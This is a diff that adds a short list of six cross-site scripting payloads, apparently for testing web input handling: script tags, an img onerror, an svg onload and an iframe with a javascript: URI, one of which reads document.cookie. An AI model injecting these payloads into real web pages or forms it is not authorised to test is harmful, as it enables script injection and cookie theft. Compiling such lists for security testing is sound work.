@@ -1,0 +1,6 @@
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+"><img src=x onerror=alert(1337)>
+<script>alert(/XSS/)</script>
+'><svg onload=alert(1)>
+"><iframe src=javascript:alert(9)>
